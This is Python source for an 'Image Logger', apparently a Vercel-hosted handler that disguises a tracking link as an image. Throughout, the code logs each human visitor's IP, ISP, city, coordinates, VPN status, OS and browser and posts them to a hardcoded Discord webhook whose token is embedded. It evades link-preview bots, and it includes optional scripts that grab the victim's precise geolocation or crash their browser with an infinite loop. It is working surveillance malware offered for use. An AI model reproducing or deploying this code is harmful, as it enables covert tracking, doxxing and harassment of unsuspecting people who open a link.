from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, json
import httpagentparser

# Configuração
config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1352417668946202624/V_mU5x7tpRUNzzaSoK2RKz1PLXzDwv2r_jaZnv5e6Y-opOIB9b9ghuPu8CtGnPfwEdKu",
    "image": "https://i.pinimg.com/564x/12/26/e0/1226e0b520b52a84933d697f52600012.jpg", 
    "imageArgument": True,

    # CUSTOMIZATION #
    "username": "Image Logger",
    "color": 0x00FFFF,

    # OPTIONS #
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by Image Logger", 
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

# Imagem de carregamento em base64
loading_image_base64 = 'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7'

def botCheck(ip, useragent):
    if ip and ip.startswith(("34", "35")):
        return "Discord"
    elif useragent and useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    try:
        requests.post(config["webhook"], json = {
        "username": config["username"],
        "content": "@everyone",
        "embeds": [
            {
                "title": "Image Logger - Error",
                "color": config["color"],
                "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
            }
        ],
        })
    except:
        pass

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if not ip or ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        if config["linkAlerts"]:
            try:
                requests.post(config["webhook"], json = {
                "username": config["username"],
                "content": "",
                "embeds": [
                    {
                        "title": "Image Logger - Link Sent",
                        "color": config["color"],
                        "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                    }
                ],
                })
            except:
                pass
        return

    ping = "@everyone"

    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
        if info.get("proxy", False):
            if config["vpnCheck"] == 2:
                return
            
            if config["vpnCheck"] == 1:
                ping = ""
        
        if info.get("hosting", False):
            if config["antiBot"] == 4:
                if info.get("proxy", False):
                    pass
                else:
                    return

            if config["antiBot"] == 3:
                return

            if config["antiBot"] == 2:
                if info.get("proxy", False):
                    pass
                else:
                    ping = ""

            if config["antiBot"] == 1:
                ping = ""

        os_info, browser_info = "Unknown", "Unknown"
        if useragent:
            try:
                os_info, browser_info = httpagentparser.simple_detect(useragent)
            except:
                pass
        
        embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [
            {
                "title": "Image Logger - IP Logged",
                "color": config["color"],
                "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coords:** `{str(info.get('lat', 'Unknown'))+', '+str(info.get('lon', 'Unknown')) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info.get('timezone', 'Unknown').split('/')[1].replace('_', ' ') if '/' in info.get('timezone', 'Unknown') else 'Unknown'} ({info.get('timezone', 'Unknown').split('/')[0] if '/' in info.get('timezone', 'Unknown') else 'Unknown'})`
> **Mobile:** `{info.get('mobile', 'Unknown')}`
> **VPN:** `{info.get('proxy', 'Unknown')}`
> **Bot:** `{info.get('hosting', False) if info.get('hosting', False) and not info.get('proxy', False) else 'Possibly' if info.get('hosting', False) else 'False'}`

**PC Info:**
> **OS:** `{os_info}`
> **Browser:** `{browser_info}`

**User Agent:**
```
{useragent}
```""",
            }
        ],
        }
        
        if url: 
            embed["embeds"][0].update({"thumbnail": {"url": url}})
        
        requests.post(config["webhook"], json = embed)
        return info
    except Exception as e:
        print(f"Error making report: {e}")
        return None

# Função handler para o Vercel
def handler(request):
    try:
        # Obter informações da requisição
        path = request.get('path', '/')
        headers = request.get('headers', {})
        
        # Processar parâmetros de consulta
        url_parts = parse.urlsplit(path)
        query_string = url_parts.query
        query = dict(parse.parse_qsl(query_string))
        
        # Extrair o IP
        ip = headers.get('x-forwarded-for', 'Unknown')
        useragent = headers.get('user-agent', '')
        
        # Processar a URL da imagem
        if config["imageArgument"]:
            if query.get("url") or query.get("id"):
                try:
                    url = base64.b64decode(query.get("url", "") or query.get("id", "").encode()).decode()
                except:
                    url = config["image"]
            else:
                url = config["image"]
        else:
            url = config["image"]

        # Verificar se é um bot
        if botCheck(ip, useragent):
            if config["buggedImage"]:
                makeReport(ip, useragent, endpoint=path, url=url)
                return {
                    "statusCode": 200,
                    "headers": {
                        "Content-Type": "image/jpeg"
                    },
                    "body": loading_image_base64,
                    "isBase64Encoded": True
                }
            else:
                makeReport(ip, useragent, endpoint=path, url=url)
                return {
                    "statusCode": 302,
                    "headers": {
                        "Location": url
                    },
                    "body": ""
                }
        else:
            # Processar localização
            if query.get("g") and config["accurateLocation"]:
                try:
                    location = base64.b64decode(query.get("g", "").encode()).decode()
                    result = makeReport(ip, useragent, location, path, url=url)
                except:
                    result = makeReport(ip, useragent, endpoint=path, url=url)
            else:
                result = makeReport(ip, useragent, endpoint=path, url=url)

            # Criar HTML de resposta
            html_content = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''

            message = config["message"]["message"]

            if result and config["message"]["richMessage"] and config["message"]["doMessage"]:
                message = message.replace("{ip}", ip or "Unknown")
                message = message.replace("{isp}", result.get("isp", "Unknown"))
                message = message.replace("{asn}", result.get("as", "Unknown"))
                message = message.replace("{country}", result.get("country", "Unknown"))
                message = message.replace("{region}", result.get("regionName", "Unknown"))
                message = message.replace("{city}", result.get("city", "Unknown"))
                message = message.replace("{lat}", str(result.get("lat", "Unknown")))
                message = message.replace("{long}", str(result.get("lon", "Unknown")))
                message = message.replace("{timezone}", f"{result.get('timezone', 'Unknown').split('/')[1].replace('_', ' ') if '/' in result.get('timezone', 'Unknown') else 'Unknown'} ({result.get('timezone', 'Unknown').split('/')[0] if '/' in result.get('timezone', 'Unknown') else 'Unknown'})")
                message = message.replace("{mobile}", str(result.get("mobile", "Unknown")))
                message = message.replace("{vpn}", str(result.get("proxy", "Unknown")))
                message = message.replace("{bot}", str(result.get("hosting", False) if result.get("hosting", False) and not result.get("proxy", False) else 'Possibly' if result.get("hosting", False) else 'False'))
                
                try:
                    os_info, browser_info = httpagentparser.simple_detect(useragent)
                    message = message.replace("{browser}", browser_info)
                    message = message.replace("{os}", os_info)
                except:
                    message = message.replace("{browser}", "Unknown")
                    message = message.replace("{os}", "Unknown")
                
                html_content = message

            if config["crashBrowser"]:
                html_content += '<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'

            if config["redirect"]["redirect"]:
                html_content = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'

            if config["accurateLocation"] and not query.get("g"):
                html_content += """<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}
</script>"""

            return {
                "statusCode": 200,
                "headers": {
                    "Content-Type": "text/html"
                },
                "body": html_content
            }
    except Exception as e:
        error_message = str(e) + "\n" + traceback.format_exc()
        reportError(error_message)
        return {
            "statusCode": 500,
            "headers": {
                "Content-Type": "text/html"
            },
            "body": "500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page."
        }
